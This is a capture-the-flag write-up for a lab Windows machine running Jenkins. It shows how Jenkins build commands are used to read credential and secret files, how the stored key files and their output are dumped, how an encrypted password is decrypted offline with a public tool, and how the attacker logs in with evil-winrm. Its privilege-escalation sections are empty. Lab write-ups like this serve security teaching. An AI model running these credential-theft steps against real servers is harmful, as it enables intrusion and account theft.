#Pwned! 
```IP
10.10.11.132
```
# Enumeration

## HTTP 80
Microsoft IIS httpd 10.0
## HTTP 8080
Jetty 9.4.43.v20210629
jenkins

we can create a new account and a project
we can configure it to execute commands when building
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216121014.png?raw=true)
indeed we get a hit to our machine from the target machine, so they can communicate
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216121050.png?raw=true)
File discovery
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217101445.png?raw=true)
We can start an enumeration in order to discover some sensitive files
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217102055.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241218111857.png?raw=true)
If we want to decrypt some credentials we find that it is possible to decrypt them as long as we have the following files:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241218112410.png?raw=true)
https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py
```
type C:\Users\Oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml
type C:\Users\Oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key
type C:\Users\Oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret
```
We get the following output:
```
Started by timer
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test
[test] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins16329493271903675368.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml 
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
        </entry>
      </domainCredentialsMap>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.84">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>ea75b5bd80e4763e</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
      <emailAddress>admin@object.local</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1634793332195</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key 
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>type C:\Users\Oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret 
�aPTñ‹ìQw3è¨¾®Ã€ƒg·¢dw-J)
uM†’,Ábˆn¨
\îÙ!Ë÷s¢E¹Ä1âªaí;>©×õU‹‡¾Õµÿ™Þ8	îÆ½¿xd$³ÌYU
©k1Î‘}ôAö»Ýv–…í„�¬©•
`K� 8
D�aIâXÒD-Å"´¾¯í‹äGt\ñQå_]Æš”�Ç>J/©«ÎL('ÞìU§ �JÌ“á­|R´7Šè=vP7ˆ:ˆDÕ{ºKI8²Äžû!U�×§“úêXÊ P¿fŠáE4ìLÜ¤^ˆöð‡*áËù‚ZˆuÒ®tdÊ„! 7zßQ"
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>exit 0 
Finished: SUCCESS
```
In order to get the binary we can convert it to base64
```
powershell.exe -c "$c=[convert]::ToBase64String((Get-Content -path 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding
byte));Write-Output $c"
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241218115035.png?raw=true)
```
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
```
Now we create our 3 files:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241218115315.png?raw=true)
And we decode our hudson file:
```
echo files/hudson.util.Secret |base64 -d > files/hudson.util.Secret.decrypted
```
Since the last decrypt tool did not work, we will try the following one:
https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py
```
wget https://raw.githubusercontent.com/gquere/pwn_jenkins/refs/heads/master/offline_decryption/jenkins_offline_decrypt.py
```
```
python jenkins_offline_decrypt.py ../files/master.key ../files/hudson.util.Secret.decrypted ../files/config.xml
```
and we get the password for oliver!
```
c1cdfun_d2434
```
And now we have local access to object.htb with evil-winrm
```
evil-winrm -i 10.10.11.132 -u oliver -p 'c1cdfun_d2434'
```
And we have the user.txt flag:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241218122448.png?raw=true)
# Exploitation

# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz

# Lateral Movement

